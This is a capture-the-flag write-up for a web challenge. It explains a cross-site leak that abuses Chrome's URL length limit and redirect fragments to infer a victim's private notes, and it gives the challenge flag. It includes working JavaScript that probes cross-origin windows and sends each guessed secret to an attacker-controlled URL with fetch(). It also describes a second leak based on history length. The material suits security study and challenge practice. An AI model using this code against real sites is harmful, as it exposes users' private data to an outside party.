# Mandatory Notes Challenge

**Author**: zeyu2001

**Category**: Web

Flag: `SEE{m4nd4t0ry_xs_l34k_dba26b9558}`

## Description

We have credible intelligence that Sussy McSus, CEO of EvilCorp, a shady MultiNational Corporation, is using this note-taking app to store sensitive information. He is known to be in cahoots with the SEE-IA. Can you find out what he is up to?

Note: the target page is `http://mnc.web.seetf.sg:1337/`.

## Difficulty

Hard

## Deployment

`docker-compose up -d`

## Solution

**Tested on Chrome Version 110.0.5481.77 (Official Build) (x86_64)**

Abusing Chrome's behavior when dealing with long URLs combined with URI fragments persisting across server redirects. I found this technique as an [unintended solution to `secrets` from HackTM CTF 2023](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets) and [added](https://github.com/xsleaks/wiki/pull/147) it to the XSLeaks Wiki.

If the note is found, the user is redirected to `?found=1#<base64 encoded JSON array of note IDs>`, otherwise they are redirected to `?found=0`.

```javascript
const found = req.session.notes.filter(note => note.text.includes(query));

if (!found.length) {
    return res.redirect('/?found=0');
}
return res.redirect(`/?found=1#${btoa(JSON.stringify(found.map(note => note.id)))}`);
```

Because URI fragments persist across server-side redirects, we can artificially inflate the URL length by adding a long fragment so that it is exactly 1 byte less than [Chrome's 2MB limit](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#url-length).

When a redirect causes the URL to increase in length, the 2MB limit is hit and the navigation is aborted. The page would become `about:blank#blocked`. Interestingly, this means that the window reference is treated as same-origin and the opener is able to read `window.origin` and other sensitive properties that are normally inaccessible from a cross-origin page.

This gives us two cases:

1. `?q=<guess>#AAA...AAA` finds a note. The user is redirected to `/?found=1#<base64 encoded JSON array of note IDs>`. Because the redirect includes a fragment, the long `#AAA...AAA` fragment is replaced with the new, much shorter fragment. The navigation proceeds as normal and the window is treated as cross-origin.
2. `?q=<guess>#AAA...AAA` does not find a note. The user is redirected to `/?found=0`. Because the redirect does not include a fragment, the long `#AAA...AAA` fragment is preserved. The navigation is aborted and the window is treated as same-origin.

Our goal is to distinguish between these two cases.

We can do this by catching the error thrown when attempting to access `window.origin` of a cross-origin window. If the error is thrown, we know that the URL length limit not exceeded and the note was found.

```javascript
const leak = async (url) => {
    let w = window.open(url + "#" + "A".repeat(2 * 1024 * 1024 - url.length - 1));
    await sleep(800);
    try {
        // Page is still same-origin, so about:blank page loaded
        // The URL length limit was exceeded
        w.origin;
        await w.close();
        return 0;
    } catch {
        // The URL length limit was not exceeded, so note was found
        await w.close();
        return 1;
    }
}
```

In order to detect the redirects, we must keep our query sufficiently short so that the original URL is at least 1 byte less than the final redirected URL. This means that we can only check 4 characters at a time (`?q=AAAA` is exactly 1 byte less than `?found=0`). We can use this to brute-force the flag character by character.

```javascript
const solve = async (char) => {
    // ?q=AAAA   redirects to
    // ?found=0  if note not found (so the URL is one character too long)
    // We can only check 4 characters at a time
    if (await leak(`http://chall?q=${flag.slice(-3) + char}`)) {
        await fetch(`${OUR_URL}?flag=${flag + char}`);
        return true;
    }
}
```

## Unintended Solution

Because `Cross-Origin-Opener-Policy` is not set, there is an unintended solution.

This challenge can also be solved through the traditional [history length leak](https://xsinator.com/testing.html#History%20Length%20Leak) technique, since the page redirects to a predictable URL when found.

1. Open a new window.
2. Set `win.location` to `baseUrl + "?q=" + query + char;`.
3. Wait for the redirect to complete.
4. Set `win.location` to `baseUrl + "?found=1#WzBd";`, and after a very short timeout, set it back to `about:blank`.

If the note was found, step 3 would have already landed the page at `baseUrl + "?found=1#WzBd";`. When the last step sets `win.location` to the same URL, the navigation is completed immediately.

If the note was not found, the short timeout means that the navigation would not have completed by the time the last step sets `win.location` to `about:blank`.

This causes a difference in the history length, which can be detected by the opener.
